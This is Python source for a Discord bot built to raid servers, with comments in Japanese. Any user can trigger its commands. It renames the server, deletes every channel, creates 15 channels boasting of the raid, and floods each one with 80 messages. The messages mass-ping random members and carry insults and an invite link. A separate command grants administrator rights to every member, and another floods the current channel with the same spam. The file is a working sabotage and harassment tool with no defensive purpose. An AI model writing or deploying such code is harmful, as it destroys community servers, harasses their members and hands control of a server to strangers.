import discord
from discord.ext import commands
import os
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CHANNEL_COUNT = 15

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)


def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return ""
    picked = random.choices(members, k=30)
    return " ".join(m.mention for m in picked) + "\n"


@bot.command()
async def start(ctx):
    """誰でも実行可：サーバー名変更→チャンネル作り替え→一斉送信"""
    guild = ctx.guild
    await ctx.send(f"{ctx.author.mention} 処理を開始します…")

    # ==============================================
    # ① サーバー名変更
    # ==============================================
    try:
        old_name = guild.name
        await guild.edit(name=SERVER_NAME, reason="!start による変更")
        await ctx.send(f"✅ サーバー名変更: 「{old_name}」→「{SERVER_NAME}」")
        await asyncio.sleep(0.5)
    except Exception as e:
        await ctx.send(f"❌ サーバー名変更失敗: {e}")

    # ==============================================
    # ② 全チャンネル削除
    # ==============================================
    deleted_count = 0
    await ctx.send(f"⚠️ 全チャンネル削除中… 合計 {len(guild.channels)} チャンネル")
    for channel in guild.channels:
        try:
            await channel.delete(reason="!start による一括削除")
            deleted_count += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"削除失敗: {channel.name} - {e}")
    await ctx.send(f"✅ {deleted_count} 個のチャンネルを削除完了")

    # ==============================================
    # ③ 新規チャンネル15個作成
    # ==============================================
    new_channels = []
    await ctx.send(f"⚠️ 新規チャンネル作成中… {CHANNEL_COUNT} 個")
    for i in range(CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(name=CHANNEL_NAME, reason="!start による作成")
            new_channels.append(ch)
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"作成失敗 {i+1}: {e}")
    await ctx.send(f"✅ {len(new_channels)} 個のチャンネル作成完了")

    # ==============================================
    # ④ 各チャンネルにメッセージ送信
    # ==============================================
    await ctx.send(f"⚠️ 各チャンネルにメッセージ送信中…")
    for ch in new_channels:
        for i in range(80):
            try:
                mentions = random_mentions(guild)
                await ch.send(mentions + COMBINED_TEXT)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"送信失敗 {ch.name} {i+1}: {e}")

    await ctx.send("🎉 **!start の処理が完了しました！**")


@bot.command()
async def admin(ctx):
    """誰でも実行可：全メンバーに管理者権限を付与"""
    guild = ctx.guild
    await ctx.send(f"{ctx.author.mention} 全メンバーに管理者権限を付与中…")

    # 管理者権限を持つロールを作成または取得
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if admin_role is None:
        admin_role = await guild.create_role(
            name="TISN管理者",
            permissions=discord.Permissions(administrator=True),
            reason="!admin による一括付与",
        )
        await ctx.send("✅ 「TISN管理者」ロールを作成しました")

    # 全メンバーにロールを付与
    count = 0
    for member in guild.members:
        if not member.bot and admin_role not in member.roles:
            try:
                await member.add_roles(admin_role, reason="!admin による一括付与")
                count += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"付与失敗 {member}: {e}")

    await ctx.send(f"✅ 完了！ {count} 人に管理者権限を付与しました！")


@bot.command()
async def aa(ctx):
    """誰でも実行可：スパム送信のみ"""
    for i in range(80):
        await ctx.send(random_mentions(ctx.guild) + COMBINED_TEXT)
        await asyncio.sleep(0.1)


@bot.event
async def on_ready():
    print(f"=== Bot起動 ===")
    print(f"ユーザー: {bot.user}")
    print(f"コマンド: !start / !admin / !aa")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("環境変数 DISCORD_BOT_TOKEN を設定してください。")

bot.run(TOKEN)